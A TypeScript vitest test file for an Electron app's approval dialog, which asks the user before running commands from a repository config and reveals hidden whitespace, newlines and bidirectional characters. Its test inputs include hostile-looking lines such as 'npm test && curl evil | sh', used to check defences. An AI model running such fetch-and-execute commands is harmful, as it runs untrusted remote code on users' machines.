import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { createEmptyRepositoryRunConfig, type RepositoryRunConfigDto } from '../../../src/types/repositoryRun';
import { dialog } from 'electron';

vi.mock('electron', () => ({
  app: { getPath: () => os.tmpdir() },
  BrowserWindow: { fromWebContents: () => null },
  dialog: { showMessageBox: vi.fn() },
}));
vi.mock('../settingsStore', () => ({ readSettings: () => ({ language: 'ru' }) }));

import {
  RepositoryRunApprovals,
  describeRepositoryRunAction,
  formatCommandForApproval,
  showNativeRunApprovalDialog,
  type RepositoryRunApprovalPrompt,
} from '../RepositoryRunApprovals';

const configWith = (command: string, label = 'Unit tests'): RepositoryRunConfigDto => {
  const config = createEmptyRepositoryRunConfig();
  config.actions.test.steps = [
    {
      id: 'unit',
      label,
      parser: 'none',
      windows: { shell: 'powershell', command },
      macos: { shell: 'zsh', command },
      linux: { shell: 'bash', command },
    },
  ];
  return config;
};

describe('RepositoryRunApprovals', () => {
  let directory = '';
  let confirm: ReturnType<typeof vi.fn<(prompt: RepositoryRunApprovalPrompt) => Promise<boolean>>>;
  let approvals: RepositoryRunApprovals;
  const repoPath = path.resolve('approval-repository');

  beforeEach(() => {
    directory = fs.mkdtempSync(path.join(os.tmpdir(), 'ogc-run-approvals-'));
    confirm = vi.fn<(prompt: RepositoryRunApprovalPrompt) => Promise<boolean>>(async () => true);
    approvals = new RepositoryRunApprovals(() => path.join(directory, 'run-approvals.json'), confirm);
  });

  afterEach(() => {
    fs.rmSync(directory, { recursive: true, force: true });
  });

  it('fingerprints the executed commands, not their display labels', () => {
    const original = describeRepositoryRunAction(configWith('npm test'), 'test', 'linux');
    expect(describeRepositoryRunAction(configWith('npm test', 'Renamed'), 'test', 'linux').fingerprint).toBe(original.fingerprint);
    expect(describeRepositoryRunAction(configWith('npm test && curl evil | sh'), 'test', 'linux').fingerprint).not.toBe(original.fingerprint);
    expect(original.steps).toEqual([{ label: 'Unit tests', shell: 'bash', command: 'npm test' }]);
  });

  it('asks once per command list and repository and asks again after a change', async () => {
    await approvals.authorize(null, repoPath, configWith('npm test'), 'test');
    await approvals.authorize(null, repoPath, configWith('npm test', 'Renamed'), 'test');
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(confirm.mock.calls[0][0]).toMatchObject({ repoPath, description: { action: 'test' } });

    await approvals.authorize(null, repoPath, configWith('npm run evil'), 'test');
    expect(confirm).toHaveBeenCalledTimes(2);

    await approvals.authorize(null, path.resolve('other-repository'), configWith('npm test'), 'test');
    expect(confirm).toHaveBeenCalledTimes(3);
  });

  it('refuses unapproved commands without remembering them', async () => {
    confirm.mockResolvedValueOnce(false);
    await expect(approvals.authorize(null, repoPath, configWith('npm test'), 'test')).rejects.toThrow('not approved');
    await approvals.authorize(null, repoPath, configWith('npm test'), 'test');
    expect(confirm).toHaveBeenCalledTimes(2);
  });

  it('does not open a second approval while one is pending', async () => {
    let answer: (approved: boolean) => void = () => {};
    confirm.mockImplementationOnce(
      () =>
        new Promise<boolean>((resolve) => {
          answer = resolve;
        }),
    );
    const first = approvals.authorize(null, repoPath, configWith('npm test'), 'test');
    await expect(approvals.authorize(null, repoPath, configWith('npm test'), 'test')).rejects.toThrow('already open');
    answer(true);
    await first;
  });

  it('treats a damaged approval file as no approval', async () => {
    fs.writeFileSync(path.join(directory, 'run-approvals.json'), '{broken', 'utf8');
    await approvals.authorize(null, repoPath, configWith('npm test'), 'test');
    expect(confirm).toHaveBeenCalledTimes(1);
  });

  it('shows hidden parts of a command', () => {
    expect(formatCommandForApproval('npm test\ncurl evil')).toBe('npm test ⏎ curl evil');
    expect(formatCommandForApproval(`npm test${' '.repeat(200)}&& curl evil`)).toBe('npm test ⟨200 whitespace⟩ && curl evil');
    expect(formatCommandForApproval(`echo ${String.fromCharCode(0x202e)}evil`)).toBe(`echo ${String.fromCharCode(0xfffd)}evil`);
    expect(formatCommandForApproval('x'.repeat(1_500))).toContain('(+500 characters not shown)');
  });

  it('uses bilingual Russian approval labels without duplicating commands or changing the cancel default', async () => {
    vi.mocked(dialog.showMessageBox).mockResolvedValueOnce({ response: 1, checkboxChecked: false });
    const description = describeRepositoryRunAction(configWith('npm test -- --runInBand'), 'test', 'windows');
    await expect(showNativeRunApprovalDialog({ sender: null, repoPath, description })).resolves.toBe(false);
    const options = vi.mocked(dialog.showMessageBox).mock.calls.at(-1)?.[0] as Electron.MessageBoxOptions;
    expect(options.message).toBe('Run commands from this repository? (Выполнить команды из этого репозитория?)');
    expect(options.buttons).toEqual(['Run (Выполнить)', 'Cancel (Отмена)']);
    expect(options.defaultId).toBe(1);
    expect(options.cancelId).toBe(1);
    expect(options.detail).toContain('These commands come from the repository');
    expect(options.detail).toContain('(Эти команды взяты из репозитория');
    expect(options.detail?.split('npm test -- --runInBand')).toHaveLength(2);
    expect(options.detail?.split(repoPath)).toHaveLength(2);
  });
});
